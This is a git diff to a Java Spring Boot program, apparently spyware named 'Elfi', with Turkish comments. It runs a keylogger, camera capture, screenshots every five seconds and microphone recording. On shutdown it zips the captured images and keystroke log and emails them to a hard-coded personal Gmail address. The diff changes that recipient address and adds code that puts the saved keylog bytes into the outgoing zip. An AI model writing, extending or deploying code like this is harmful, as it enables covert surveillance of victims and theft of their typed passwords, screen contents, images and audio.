@@ -4,7 +4,9 @@ import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.nio.charset.StandardCharsets;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
@@ -23,11 +25,11 @@ public class ElfiApplication {
         SpringApplication.run(ElfiApplication.class, args);
 
         KeyLogger keyLogger = new KeyLogger();
+        VoiceCapture recorder = new VoiceCapture();
 
         // Keylogger'ı yeni bir thread'de başlatıyoruz
         // Keylogger'ı başlat
         new Thread(keyLogger::startKeyLogger).start();
-
         // Kamerayı yeni bir thread'de başlatıyoruz
         new Thread(() -> {
             CameraCapture.capture(); // Kamerayı başlat
@@ -39,16 +41,17 @@ public class ElfiApplication {
             ScreenCapture.captureScreen(); // Her 5 saniyede bir ekran görüntüsü alır
         }, 0, 5, TimeUnit.SECONDS); // İlk başlatma zamanını 0, tekrar aralığını 5 saniye ayarlıyoruz
 
-        VoiceCapture recorder = new VoiceCapture();
 
         recorder.startRecording(Constants.resourcesPath+"output.wav");
+
+//        recorder.startRecording();
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             System.out.println("Application is closing...");
             recorder.stopRecording();
 
             // Example: Use the com.isee.elfi.FileZipper class to zip a file
-            String toEmail = "mertayhandev@gmail.com";
+            String toEmail = "ozgurcoderr@gmail.com";
             String subject = "ISEE.ELFI DENEME";
             String bodyText = "This email contains a ZIP file attachment.";
 
@@ -67,17 +70,31 @@ public class ElfiApplication {
                     fileContents.put(fileName, imageList.get(index));
                 }
 
-                fileContents.put("keylogger.txt", keyLogger.getLogAsBytes());
+                try {
+                    byte[] logBytes = KeyLogger.savedBytes;
+                    if (logBytes != null) {
+                        fileContents.put("keylogger.txt", logBytes);
+                        System.out.println("Keylogger log saved to file and added to the map.");
+                    }
+                } catch (Exception e) {
+                    System.out.println(e.getMessage());
+                }
+
+//                try {
+//                    if (VoiceCapture.audioBytes != null) {
+//                        fileContents.put("output.wav", recorder.getAudioBytes());
+//                    }
+//                } catch (Exception e) {
+//                   System.out.println(e.getMessage());
+//                }
 
                 // Zip the images
                 Zipper zipper = new Zipper();
                 byte[] zipData = zipper.zipFiles(fileContents);
 
                 System.out.println("ZIP file created in memory, size: " + zipData.length + " bytes.");
-
                 // Send the ZIP as an email attachment
                 sendEmailWithInMemoryAttachment(toEmail, subject, bodyText, zipData, zipFileName);
-
 
             } catch (IOException e) {
                 System.err.println("Error while creating the ZIP file: " + e.getMessage());
@@ -96,6 +113,5 @@ public class ElfiApplication {
 
 
 
-        keyLogger.stopKeyLogger();
     }
 }
